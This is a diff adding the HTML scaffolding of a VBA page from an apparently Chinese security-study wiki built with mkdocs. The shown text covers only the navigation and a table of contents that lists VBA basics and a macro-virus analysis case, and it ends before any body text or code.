@@ -1,0 +1,3538 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.6">
+    
+    
+      
+        <title>VBA - knowledge_wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#757575">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="grey" data-md-color-accent="brown">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#1office-macor" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="knowledge_wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                knowledge_wiki
+              </span>
+              <span class="md-header-nav__topic">
+                VBA
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="knowledge_wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    knowledge_wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Web security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Web security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/01introduce/" title="Security Basic" class="md-nav__link">
+      Security Basic
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/02information_gathering/" title="information gathering" class="md-nav__link">
+      information gathering
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/03Web_Security_protocol/" title="Web Security protocol" class="md-nav__link">
+      Web Security protocol
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/04SQL_Injection/" title="SQL Injection" class="md-nav__link">
+      SQL Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/05xxe/" title="xxe" class="md-nav__link">
+      xxe
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/06Code_Injection/" title="Code Injection" class="md-nav__link">
+      Code Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/07Command_execute/" title="Command execute" class="md-nav__link">
+      Command execute
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/08Variable_Coverage/" title="Variable Coverage" class="md-nav__link">
+      Variable Coverage
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/09XSS/" title="XSS" class="md-nav__link">
+      XSS
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/10CSRF/" title="CSRF" class="md-nav__link">
+      CSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/11file_processing/" title="File Processing" class="md-nav__link">
+      File Processing
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/12Session_Management/" title="Session Management" class="md-nav__link">
+      Session Management
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/13Unvalidated_Redirects_and_Forwards/" title="Unvalidated Redirects and Forwards" class="md-nav__link">
+      Unvalidated Redirects and Forwards
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/14SSRF/" title="SSRF" class="md-nav__link">
+      SSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/15unserialize/" title="unserialize" class="md-nav__link">
+      unserialize
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/16Databases_Security/" title="Databases Security" class="md-nav__link">
+      Databases Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/17Operating_system_Security/" title="Operating system Security" class="md-nav__link">
+      Operating system Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/18Middleware_Security/" title="Middleware Security" class="md-nav__link">
+      Middleware Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/19Pentest_Cheat_Sheets/" title="Pentest Cheat Sheets" class="md-nav__link">
+      Pentest Cheat Sheets
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-20" type="checkbox" id="nav-2-20">
+    
+    <label class="md-nav__link" for="nav-2-20">
+      tools
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-20">
+        tools
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/tools_common/" title="common" class="md-nav__link">
+      common
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/tools_Nmap/" title="nmap" class="md-nav__link">
+      nmap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/tools_Burpsuite/" title="Burpsuite" class="md-nav__link">
+      Burpsuite
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/tools_SQLMap/" title="SQLMap" class="md-nav__link">
+      SQLMap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Web_Security/tools_Metasploit/" title="Metasploit" class="md-nav__link">
+      Metasploit
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Bug-Bounty
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Bug-Bounty
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Bug-Bounty/Bug-Bounty/" title="Bug-Bounty" class="md-nav__link">
+      Bug-Bounty
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Bug-Bounty/CTF/" title="CTF" class="md-nav__link">
+      CTF
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Research on program vulnerabilities
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Research on program vulnerabilities
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/攻击类漏洞利用/" title="漏洞利用" class="md-nav__link">
+      漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/01PHP Security/" title="PHP Security" class="md-nav__link">
+      PHP Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/02Binary_Security/" title="Binary Security" class="md-nav__link">
+      Binary Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/03Malware_tech/" title="Malware analysis" class="md-nav__link">
+      Malware analysis
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/04Malware_Analysis_tech/" title="Malware analysis tech" class="md-nav__link">
+      Malware analysis tech
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Computer Forensics
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Computer Forensics
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/00APT上机检查思路/" title="Introduce" class="md-nav__link">
+      Introduce
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/01Windows执行痕迹搜集/" title="Windows执行痕迹搜集" class="md-nav__link">
+      Windows执行痕迹搜集
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/02流量分析/" title="流量分析" class="md-nav__link">
+      流量分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/03内存分析/" title="内存分析" class="md-nav__link">
+      内存分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/04入侵痕迹排查-Linux/" title="入侵痕迹排查-Linux" class="md-nav__link">
+      入侵痕迹排查-Linux
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/04入侵痕迹排查-Windows/" title="入侵痕迹排查-Windows" class="md-nav__link">
+      入侵痕迹排查-Windows
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/06入侵手法/" title="入侵手法" class="md-nav__link">
+      入侵手法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/05tools_common/" title="tools_commo" class="md-nav__link">
+      tools_commo
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../Information_Security_Engineer/" title="Information Security Engineer" class="md-nav__link">
+      Information Security Engineer
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7" checked>
+    
+    <label class="md-nav__link" for="nav-7">
+      common
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        common
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../00_Programer_learn_Strategy/" title="程序员攻略" class="md-nav__link">
+      程序员攻略
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../01_Algrothm/" title="Algrothm" class="md-nav__link">
+      Algrothm
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
+    
+    <label class="md-nav__link" for="nav-7-3">
+      Python
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-3">
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_1_python_基本语法/" title="基本语法" class="md-nav__link">
+      基本语法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_2_python_变量和数据类型/" title="变量和数据类型" class="md-nav__link">
+      变量和数据类型
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_3_python_流程控制/" title="流程控制" class="md-nav__link">
+      流程控制
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_4_python_函数及作用域/" title="函数及作用域" class="md-nav__link">
+      函数及作用域
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_5_python_数学/" title="数学函数" class="md-nav__link">
+      数学函数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_6_python_字符串/" title="字符串" class="md-nav__link">
+      字符串
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_7_python_列表/" title="列表" class="md-nav__link">
+      列表
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_8_python_tuple/" title="tuple" class="md-nav__link">
+      tuple
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_9_python_字典/" title="字典" class="md-nav__link">
+      字典
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_10_python_集合/" title="集合" class="md-nav__link">
+      集合
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_11_python_文件操作/" title="文件操作" class="md-nav__link">
+      文件操作
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_12_python_os/" title="OS" class="md-nav__link">
+      OS
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_13_python_shutil/" title="shutil" class="md-nav__link">
+      shutil
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_14_python_zip压缩/" title="zip压缩" class="md-nav__link">
+      zip压缩
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_15_python_calendar日历/" title="calendar日历" class="md-nav__link">
+      calendar日历
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_16_python_time时间/" title="time时间" class="md-nav__link">
+      time时间
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_17_python_类和对象/" title="类和对象" class="md-nav__link">
+      类和对象
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_18_python_模块和包/" title="模块和包" class="md-nav__link">
+      模块和包
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_19_python_错误和异常处理/" title="错误和异常处理" class="md-nav__link">
+      错误和异常处理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_20_python_tkinter/" title="tkinter" class="md-nav__link">
+      tkinter
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_21_python_性能/" title="性能" class="md-nav__link">
+      性能
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02_22_python_多线程/" title="多线程" class="md-nav__link">
+      多线程
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-23" type="checkbox" id="nav-7-3-23">
+    
+    <label class="md-nav__link" for="nav-7-3-23">
+      Flask
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-7-3-23">
+        Flask
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Python_flask/1_URL和视图笔记/" title="URL和视图笔记" class="md-nav__link">
+      URL和视图笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Python_flask/2_模板笔记/" title="模板" class="md-nav__link">
+      模板
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Python_flask/3_数据库/" title="数据库" class="md-nav__link">
+      数据库
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Python_flask/4_cookie和session笔记/" title="cookie和session笔记" class="md-nav__link">
+      cookie和session笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../03_C_C++_Basic/" title="C_C++" class="md-nav__link">
+      C_C++
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../03_1_MFC/" title="C++_MFC" class="md-nav__link">
+      C++_MFC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../04_Java_Book/" title="Java" class="md-nav__link">
+      Java
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        VBA
+      </label>
+    
+    <a href="./" title="VBA" class="md-nav__link md-nav__link--active">
+      VBA
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1office-macor" title="1、Office Macor" class="md-nav__link">
+    1、Office Macor
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2vba" title="2、VBA代码阅读扫盲" class="md-nav__link">
+    2、VBA代码阅读扫盲
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" title="(1) 环境介绍" class="md-nav__link">
+    (1) 环境介绍
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="(2) 宏脚本运行入口点" class="md-nav__link">
+    (2) 宏脚本运行入口点
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" title="方法1：" class="md-nav__link">
+    方法1：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1_2" title="方法1：测试代码" class="md-nav__link">
+    方法1：测试代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" title="方法2：" class="md-nav__link">
+    方法2：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" title="方法2：测试代码" class="md-nav__link">
+    方法2：测试代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="小结：" class="md-nav__link">
+    小结：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" title="(3) 代码调试" class="md-nav__link">
+    (3) 代码调试
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" title="(4) 变量" class="md-nav__link">
+    (4) 变量
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" title="(5) 运算符" class="md-nav__link">
+    (5) 运算符
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" title="(6) 逻辑运算符" class="md-nav__link">
+    (6) 逻辑运算符
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-if" title="(7) IF分支选择结构" class="md-nav__link">
+    (7) IF分支选择结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-selectcase" title="(8) Select...Case分支选择结构" class="md-nav__link">
+    (8) Select...Case分支选择结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#9" title="(9) 循环结构" class="md-nav__link">
+    (9) 循环结构
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#doloop" title="Do...Loop循环" class="md-nav__link">
+    Do...Loop循环
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fornext" title="For...Next循环" class="md-nav__link">
+    For...Next循环
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for_each_in" title="For_Each_In循环" class="md-nav__link">
+    For_Each_In循环
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#10" title="(10) 数组表达" class="md-nav__link">
+    (10) 数组表达
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="数组声明" class="md-nav__link">
+    数组声明
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uboundlbound" title="Ubound和Lbound函数获取数组的上下限" class="md-nav__link">
+    Ubound和Lbound函数获取数组的上下限
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#11" title="(11) 字符串操作" class="md-nav__link">
+    (11) 字符串操作
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hexhex2dec" title="Hex与Hex2Dec函数" class="md-nav__link">
+    Hex与Hex2Dec函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="文本函数" class="md-nav__link">
+    文本函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#replace" title="Replace函数" class="md-nav__link">
+    Replace函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#split" title="Split函数" class="md-nav__link">
+    Split函数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" title="(12) 文件读写" class="md-nav__link">
+    (12) 文件读写
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="文件遍历" class="md-nav__link">
+    文件遍历
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="文件属性" class="md-nav__link">
+    文件属性
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3_1" title="3、常用对象" class="md-nav__link">
+    3、常用对象
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-adodbstream" title="(1) ADODB.Stream 对象" class="md-nav__link">
+    (1) ADODB.Stream 对象
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-msxml2xmlhttp" title="(2) Msxml2.XMLHTTP 对象" class="md-nav__link">
+    (2) Msxml2.XMLHTTP 对象
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_2" title="(3) 执行命令对象与函数" class="md-nav__link">
+    (3) 执行命令对象与函数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4_1" title="4、案例：宏病毒分析" class="md-nav__link">
+    4、案例：宏病毒分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_3" title="(1) 调试环境" class="md-nav__link">
+    (1) 调试环境
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_3" title="(2) 调试过程" class="md-nav__link">
+    (2) 调试过程
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_3" title="(3) 工具提取宏" class="md-nav__link">
+    (3) 工具提取宏
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Other-Powersehll/" title="Powersehll" class="md-nav__link">
+      Powersehll
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../安全岗位面试/" title="面试" class="md-nav__link">
+      面试
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1office-macor" title="1、Office Macor" class="md-nav__link">
+    1、Office Macor
+  </a>
+  
+</li>
+      
